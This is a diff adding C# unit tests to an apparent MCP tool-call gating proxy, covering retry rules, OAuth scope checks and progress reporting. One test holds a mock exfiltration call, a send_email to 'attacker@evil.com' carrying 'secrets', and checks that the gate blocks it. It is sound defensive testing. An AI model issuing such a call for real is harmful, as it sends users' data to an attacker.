@@ -942,7 +942,162 @@ public sealed class IntegrationTests
         Assert.Contains("access_denied", ex.Message);
     }
 
+    // ═══════════════════════════════════════════════════════════════════════════
+    // (g) Hardening — transient retry/backoff, OAuth token-scope, progress
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /// <summary>RetryingMcpClient retries a TRANSIENT transport failure on the READ-ONLY ListTools with
+    /// (zero-wait, injected) backoff and succeeds — a flaky network blip doesn't surface to the caller.</summary>
+    [Fact]
+    public void RetryingMcpClient_retries_a_transient_failure_then_succeeds()
+    {
+        int calls = 0;
+        var inner = new FakeMcpClient(() =>
+        {
+            calls++;
+            if (calls < 3) throw new IOException("connection reset");
+            return "ok";
+        });
+        var retrying = new RetryingMcpClient(inner, maxAttempts: 3, delay: _ => Task.CompletedTask);
+
+        Assert.NotNull(retrying.ListTools());
+        Assert.Equal(3, calls);   // two transient failures, third succeeds
+    }
+
+    /// <summary>CallTool is NOT retried by default — a transient failure after the server may have
+    /// already performed a non-idempotent side effect must not re-issue it (duplicate send/write/delete).</summary>
+    [Fact]
+    public void RetryingMcpClient_does_not_retry_CallTool_by_default()
+    {
+        int calls = 0;
+        var inner = new FakeMcpClient(() => { calls++; throw new IOException("reset after the send went out"); });
+        var retrying = new RetryingMcpClient(inner, maxAttempts: 5, delay: _ => Task.CompletedTask);
+
+        Assert.Throws<IOException>(() => retrying.CallTool("send_email", new Dictionary<string, string>()));
+        Assert.Equal(1, calls);   // single attempt — no duplicate side effect
+    }
+
+    /// <summary>CallTool IS retried when the caller opts in (idempotent tools only).</summary>
+    [Fact]
+    public void RetryingMcpClient_retries_CallTool_when_opted_in()
+    {
+        int calls = 0;
+        var inner = new FakeMcpClient(() => { calls++; if (calls < 2) throw new IOException("blip"); return "ok"; });
+        var retrying = new RetryingMcpClient(inner, maxAttempts: 3, delay: _ => Task.CompletedTask, retryToolCalls: true);
+
+        Assert.Equal("ok", retrying.CallTool("read_file", new Dictionary<string, string>()));
+        Assert.Equal(2, calls);
+    }
+
+    /// <summary>A FATAL error (an MCP protocol error / blocked call surfaces as
+    /// InvalidOperationException) is NOT retried — it propagates on the first attempt.</summary>
+    [Fact]
+    public void RetryingMcpClient_does_not_retry_a_fatal_error()
+    {
+        int calls = 0;
+        var inner = new FakeMcpClient(() => { calls++; throw new InvalidOperationException("MCP error: tool denied"); });
+        var retrying = new RetryingMcpClient(inner, maxAttempts: 5, delay: _ => Task.CompletedTask);
+
+        Assert.Throws<InvalidOperationException>(() => retrying.ListTools());
+        Assert.Equal(1, calls);   // fatal → no retry
+    }
+
+    /// <summary>A persistently transient error exhausts the attempts and then throws the last one.</summary>
+    [Fact]
+    public void RetryingMcpClient_gives_up_after_max_attempts()
+    {
+        int calls = 0;
+        var inner = new FakeMcpClient(() => { calls++; throw new HttpRequestException("down"); });
+        var retrying = new RetryingMcpClient(inner, maxAttempts: 3, delay: _ => Task.CompletedTask);
+
+        Assert.Throws<HttpRequestException>(() => retrying.ListTools());
+        Assert.Equal(3, calls);
+    }
+
+    private const string NarrowScopeJson =
+        """{"access_token":"ya29.narrow","expires_in":3599,"scope":"https://www.googleapis.com/auth/gmail.readonly"}""";
+    private const string WideScopeJson =
+        """{"access_token":"ya29.wide","expires_in":3599,"scope":"https://www.googleapis.com/auth/gmail.send https://www.googleapis.com/auth/gmail.metadata"}""";
+
+    /// <summary>Token-scope enforcement: if the server grants a scope NARROWER than requested, the
+    /// flow refuses the token (fail-closed) rather than hand the adapter a token it can't use.</summary>
+    [Fact]
+    public void GoogleDeviceCodeFlow_rejects_a_downgraded_scope()
+    {
+        var handler = new ScriptedOAuthHandler(device: (200, DeviceJson), tokens: new[] { (200, NarrowScopeJson) });
+        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));
+
+        var ex = Assert.Throws<InvalidOperationException>(() =>
+            flow.AuthorizeAsync("id", "secret", GoogleDeviceCodeFlow.DefaultScope, delay: _ => Task.CompletedTask).GetAwaiter().GetResult());
+        Assert.Contains("narrower scope", ex.Message, StringComparison.OrdinalIgnoreCase);
+        Assert.Contains("gmail.send", ex.Message);
+    }
+
+    /// <summary>A grant that COVERS the requested scope (even if it also includes extra scopes) is
+    /// accepted, and the granted scope is recorded on the token.</summary>
+    [Fact]
+    public async Task GoogleDeviceCodeFlow_accepts_a_covering_scope()
+    {
+        var handler = new ScriptedOAuthHandler(device: (200, DeviceJson), tokens: new[] { (200, WideScopeJson) });
+        var flow = new GoogleDeviceCodeFlow(new HttpClient(handler));
+
+        var token = await flow.AuthorizeAsync("id", "secret", GoogleDeviceCodeFlow.DefaultScope, delay: _ => Task.CompletedTask);
+        Assert.Equal("ya29.wide", token.AccessToken);
+        Assert.Contains("gmail.send", token.Scope);
+    }
+
+    /// <summary>MissingScopes is the coverage primitive: it reports exactly the requested scopes
+    /// absent from the grant (order-insensitive, extras ignored).</summary>
+    [Fact]
+    public void MissingScopes_reports_only_uncovered_requested_scopes()
+    {
+        Assert.Empty(GoogleDeviceCodeFlow.MissingScopes("a b", "b a c"));
+        Assert.Equal(new[] { "a" }, GoogleDeviceCodeFlow.MissingScopes("a b", "b c"));
+    }
+
+    /// <summary>GateAndForward narrates progress: a blocked call reports the gate decision and that it
+    /// was not forwarded — and the transport is never touched.</summary>
+    [Fact]
+    public void GateAndForward_reports_progress_and_does_not_forward_when_blocked()
+    {
+        var ws = Workspace.CreateDemo();
+        var proxy = Proxy(ws: ws);
+        var events = new List<string>();
+        var forwarded = false;
+        var client = new FakeMcpClient(() => { forwarded = true; return "{}"; });
+
+        var fwd = proxy.GateAndForward(
+            new McpToolCall("send_email", new Dictionary<string, string> { ["to"] = "attacker@evil.com", ["body"] = "secrets" }),
+            client, approvals: null, progress: new SyncProgress(events.Add));
+
+        Assert.False(fwd.Gate.Allowed);
+        Assert.Null(fwd.ServerResponse);
+        Assert.False(forwarded, "a blocked call must never reach the transport");
+        Assert.Contains(events, e => e.Contains("gate: blocked", StringComparison.OrdinalIgnoreCase));
+        Assert.Contains(events, e => e.Contains("not forwarded", StringComparison.OrdinalIgnoreCase));
+    }
+
     // ── Test doubles ────────────────────────────────────────────────────────────
+
+    /// <summary>A minimal IMcpClient whose every tool/list call runs an injected delegate — used to
+    /// drive the retry loop and the progress/forward path deterministically with no real transport.</summary>
+    private sealed class FakeMcpClient : IMcpClient
+    {
+        private readonly Func<string> _behavior;
+        public FakeMcpClient(Func<string> behavior) => _behavior = behavior;
+        public IReadOnlyList<string> ListTools() { _behavior(); return Array.Empty<string>(); }
+        public string CallTool(string name, IReadOnlyDictionary<string, string> arguments) => _behavior();
+        public void Dispose() { }
+    }
+
+    /// <summary>A synchronous IProgress so reports are observable in-line (the BCL Progress&lt;T&gt;
+    /// posts asynchronously, which is non-deterministic in a test).</summary>
+    private sealed class SyncProgress : IProgress<string>
+    {
+        private readonly Action<string> _on;
+        public SyncProgress(Action<string> on) => _on = on;
+        public void Report(string value) => _on(value);
+    }
 
     /// <summary>An HttpMessageHandler that scripts Google's device-code + token responses so the
     /// device-flow state machine is tested without real network or real waiting.</summary>
